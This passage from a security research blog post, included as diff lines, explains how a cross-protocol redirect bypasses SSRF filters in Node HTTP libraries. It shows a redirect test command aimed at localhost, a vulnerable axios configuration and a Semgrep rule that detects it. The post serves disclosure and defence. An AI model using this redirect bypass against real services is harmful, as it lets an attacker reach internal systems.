+<span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span>
+    <span class="na">agent</span><span class="p">:</span> <span class="nx">ssrfFilter</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
+<span class="p">}).</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Success</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">${error.toString().split(</span><span class="dl">'</span><span class="err">\</span><span class="nx">n</span><span class="dl">'</span><span class="s1">)[0]}</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>Contrary to the <code class="language-plaintext highlighter-rouge">request</code> library though, it simply fails in the case of a cross-protocol redirect:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>node fetch.js <span class="s2">"https://tellico.fun/redirect.php?target=http://localhost/test"</span>
+Testing https://tellico.fun/redirect.php?target<span class="o">=</span>http://localhost/test
+TypeError <span class="o">[</span>ERR_INVALID_PROTOCOL]: Protocol <span class="s2">"http:"</span> not supported. Expected <span class="s2">"https:"</span>
+</code></pre></div></div>
+
+<p>It is therefore impossible to perform a similar attack on this library.</p>
+
+<h2 id="axios">Axios</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">axios</code> library’s options allow to overwrite agents for both protocols separately. Therefore the following code is protected:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span>
+    <span class="na">httpAgent</span><span class="p">:</span> <span class="nx">ssrfFilter</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://domain</span><span class="dl">"</span><span class="p">),</span>
+    <span class="na">httpsAgent</span><span class="p">:</span> <span class="nx">ssrfFilter</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://domain</span><span class="dl">"</span><span class="p">)</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p><strong>Note:</strong> In Axios library, it is neccesary to hardcode the urls during the agent overwrite. Otherwise, one of the agents would be overwritten with an agent for a wrong protocol and the cross-protocol redirect would fail similarly to the <code class="language-plaintext highlighter-rouge">node-fetch</code> library.</p>
+
+<p>Still, <code class="language-plaintext highlighter-rouge">axios</code> calls can be vulnerable. If one forgets to overwrite both agents, the cross-protocol redirect can bypass the filter:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span>
+    <span class="c1">// httpAgent: ssrfFilter(url),</span>
+    <span class="na">httpsAgent</span><span class="p">:</span> <span class="nx">ssrfFilter</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>Such misconfigurations can be easily missed, so we have created a <a href="https://semgrep.dev/">Semgrep</a> rule that catches similar patterns in JavaScript code:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rules:
+  - id: axios-only-one-agent-set
+    message: Detected an Axios call that overwrites only one HTTP(S) agent. It can lead to a bypass of restriction implemented in the agent implementation. For example SSRF protection can be bypassed by a malicious server redirecting the client from HTTPS to HTTP (or the other way around).
+    mode: taint
+    pattern-sources:
+      - patterns:
+        - pattern-either:
+            - pattern: |
+                {..., httpsAgent:..., ...}
+            - pattern: |
+                {..., httpAgent:..., ...}
+        - pattern-not: |
+                {...,httpAgent:...,httpsAgent:...}
+    pattern-sinks:
+      - pattern: $AXIOS.request(...)
+      - pattern: $AXIOS.get(...)
+      - pattern: $AXIOS.delete(...)
+      - pattern: $AXIOS.head(...)
+      - pattern: $AXIOS.options(...)
+      - pattern: $AXIOS.post(...)
+      - pattern: $AXIOS.put(...)
+      - pattern: $AXIOS.patch(...)
+    languages:
+      - javascript
+      - typescript
+    severity: WARNING
+</code></pre></div></div>
+
+<h1 id="summary">Summary</h1>
+
+<p>As discussed above, we have discovered an exploitable SSRF vulnerability in the popular <a href="https://www.npmjs.com/package/request">request</a> library. Despite the fact that this package has been deprecated, this dependency is still used by over 50k projects with over 18M downloads per week.</p>
+
+<p>We demonstrated how an attacker can bypass any anti-SSRF mechanisms injected into this library by simply redirecting the request to another protocol (e.g. HTTP to HTTPS). While many libraries we reviewed did provide protection from such attacks, others such as <code class="language-plaintext highlighter-rouge">axios</code> could be potentially  vulnerable when similar misconfigurations exist. In an effort to make these issues easier to find and avoid, we have also released our internal Semgrep rule.</p>
+
+</div>
+<div class="related">
+  <h3>Other relevant posts:</h3> 
+  <ul class="related-posts">
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html">
+            Unveiling the Prototype Pollution Gadgets Finder
+            <small>17 Feb 2024</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2024/01/30/poiex-release.html">
+            Introducing PoIEx - Points Of Intersection Explorer
+            <small>30 Jan 2024</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2023/11/03/Office-Document-Poisoning.html">
+            Office Documents Poisoning in SHVE
+            <small>03 Nov 2023</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2023/09/25/clientside-javascript-instrumentation.html">
+            Client-side JavaScript Instrumentation
+            <small>25 Sep 2023</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2023/07/26/huawei-theme-arbitrary-code-exec.html">
+            Huawei Theme Manager Arbitrary Code Execution
+            <small>26 Jul 2023</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2023/03/21/windows-installer.html">
+            Windows Installer EOP (CVE-2023-21800)
+            <small>21 Mar 2023</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+    
+       
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">
+            A New Vector For “Dirty” Arbitrary File Write to RCE
+            <small>28 Feb 2023</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2023/02/14/pesd-extension-public-release.html">
+            Introducing Proxy Enriched Sequence Diagrams (PESD)
+            <small>14 Feb 2023</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2022/12/13/safeurl.html">
+            safeurl for Go
+            <small>13 Dec 2022</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2022/11/15/learning-ajp.html">
+            Let's speak AJP
+            <small>15 Nov 2022</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2022/10/18/cloudsectidbit-dataimport.html">
+            The Danger of Falling to System Role in AWS SDK Client
+            <small>18 Oct 2022</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2022/09/27/electron-api-default-permissions.html">
+            Diving Into Electron Web API Permissions
+            <small>27 Sep 2022</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2022/07/21/dependency-confusion.html">
+            Dependency Confusion
+            <small>21 Jul 2022</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2022/06/09/apache-pinot-sqli-rce.html">
+            Apache Pinot SQLi and RCE Cheat Sheet
+            <small>09 Jun 2022</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2021/03/11/regexploit.html">
+            Regexploit: DoS-able Regular Expressions
+            <small>11 Mar 2021</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2020/04/30/polymorphic-images-for-xss.html">
+            Researching Polymorphic Images for XSS on Google Scholar
+            <small>30 Apr 2020</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2019/08/22/modern-password-managers-flag-secure.html">
+            One Bug To Rule Them All: Modern Android Password Managers and FLAG_SECURE Misuse
+            <small>22 Aug 2019</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2019/08/01/common-crypto-bugs.html">
+            Lessons in auditing cryptocurrency wallets, systems, and infrastructures
+            <small>01 Aug 2019</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2019/07/22/jackson-gadgets.html">
+            Jackson gadgets - Anatomy of a vulnerability
+            <small>22 Jul 2019</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2019/04/24/rubyzip-bug.html">
+            On insecure zip handling, Rubyzip and Metasploit RCE (CVE-2019-5624)
+            <small>24 Apr 2019</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2018/11/05/burp-rest-api-v2.html">
+            Introducing burp-rest-api v2
+            <small>05 Nov 2018</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2018/05/17/graphql-security-overview.html">
+            GraphQL - Security Overview and Testing Tips
+            <small>17 May 2018</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+                           
+    
+    
+    
+    
+      
+      <li>
+        <h3>
+          <a href="/2017/03/02/training-burp.html">
+            Developing Burp Suite Extensions training
+            <small>02 Mar 2017</small>
+          </a>
+        </h3>
+      </li>
+       
+                           
+    
+  </ul>
+</div>
+
+      </div>
+    </div>
+
+  <script src="/public/js/jquery.min.js"></script>
+  <script src="/public/js/main.js"></script>
+  
+
+</body></html>
